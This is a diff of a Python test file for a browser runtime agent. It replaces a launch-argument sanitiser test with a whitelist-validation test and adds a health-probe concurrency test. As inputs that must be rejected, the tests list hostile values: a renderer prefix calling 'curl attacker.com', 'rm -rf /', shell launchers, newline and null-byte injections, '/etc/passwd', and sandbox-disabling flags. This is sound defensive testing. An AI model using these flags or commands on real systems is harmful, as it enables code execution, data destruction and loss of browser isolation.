@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import asyncio
 import json
+import time
 from pathlib import Path
 from unittest.mock import AsyncMock, MagicMock
 
@@ -22,58 +23,25 @@ from cbrowser.runtime_agent.protocol import (
     RuntimeStateRecord,
 )
 from cbrowser.runtime_agent.runner import BrowserRunner
-from cbrowser.runtime_agent.security import is_flag_safe, sanitize_launch_args
+from cbrowser.launch_args import InvalidLaunchArgument, validate_launch_args
 from cbrowser.runtime_agent.subsystems import check_audio, check_browser, check_display
 
 
-def test_launch_args_security_sanitization() -> None:
-    safe = [
-        "--disable-features=Translate,OptimizationHints",
-        "--enable-features=CDPScreenshotNewSurface",
-        "--blink-settings=primaryHoverType=2",
-        "--force-color-profile=srgb",
-        "--user-agent=CustomBrowser/1.0",
-    ]
-    assert sanitize_launch_args(safe) == safe
+def test_launch_args_whitelist_contract() -> None:
+    safe = ["--no-first-run", "--lang=en-US", "--accept-lang=en-US,zh-CN"]
+    assert validate_launch_args(safe) == safe
 
-    reserved = [
-        "--remote-debugging-port=9999",
-        "--remote-debugging-address=0.0.0.0",
-        "--remote-debugging-pipe",
-        "--user-data-dir=/etc/shadow",
-        "--display=:0",
-        "--force-device-scale-factor=2",
+    for arg in (
+        "--load-extension=/tmp/evil",
+        "--js-flags=--noopt",
+        "file:///etc/passwd",
+        "--fingerprint=123",
         "--window-size=800,600",
-        "--window-position=100,100",
-    ]
-    for r in reserved:
-        assert not is_flag_safe(r)
-    assert sanitize_launch_args(reserved) == []
-
-    unsafe = [
-        "--renderer-cmd-prefix=/bin/sh -c 'curl attacker.com'",
-        "--gpu-launcher=/bin/bash",
-        "--utility-cmd-prefix=rm -rf /",
-        "--ppapi-plugin-launcher=/tmp/bad",
-        "--allow-file-access-from-files",
-        "--disable-web-security",
-        "--disable-features=IsolateOrigins",
-        "--disable-features=IsolateOrigins,OtherFeature",
-        "--extra-plugin-dir=/tmp",
         "--no-sandbox",
-    ]
-    for u in unsafe:
-        assert not is_flag_safe(u), f"Flag {u} should be deemed unsafe"
-    assert sanitize_launch_args(unsafe) == []
-
-    injections = [
-        "--flag\n--evil",
-        "--flag\r\n--evil",
-        "--flag\x00evil",
-    ]
-    for inj in injections:
-        assert not is_flag_safe(inj)
-    assert sanitize_launch_args(injections) == []
+        "--disable-web-security",
+    ):
+        with pytest.raises(InvalidLaunchArgument):
+            validate_launch_args([arg])
 
 
 def test_event_storage_atomic_write_and_recovery(tmp_path: Path) -> None:
@@ -265,7 +233,9 @@ def test_runner_snapshot_validation_failures(tmp_path: Path) -> None:
 
 
 @pytest.mark.asyncio
-async def test_agent_app_routes(tmp_path: Path) -> None:
+async def test_agent_app_routes(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
     run_dir = tmp_path / "runtime"
     run_dir.mkdir(parents=True, exist_ok=True)
     download_dir = tmp_path / "downloads"
@@ -328,6 +298,22 @@ async def test_agent_app_routes(tmp_path: Path) -> None:
         # Control endpoint: invalid action -> 400
         bad_ctrl = await client.post("/control", json={"action": "rm -rf /"})
         assert bad_ctrl.status_code in (400, 422)
+
+        # Health probes run concurrently off the event loop.
+        from cbrowser.runtime_agent import agent as agent_module
+
+        def slow_probe(*_args, **_kwargs):
+            time.sleep(0.25)
+            return True, "ok"
+
+        monkeypatch.setattr(agent_module, "check_display", slow_probe)
+        monkeypatch.setattr(agent_module, "check_audio", slow_probe)
+        monkeypatch.setattr(agent_module, "check_browser", slow_probe)
+        started = time.monotonic()
+        fast_health = await client.get("/health")
+        elapsed = time.monotonic() - started
+        assert fast_health.status_code == 200
+        assert elapsed < 0.6, elapsed
 
         # Events endpoints
         evts_resp = await client.get("/events/runtime")
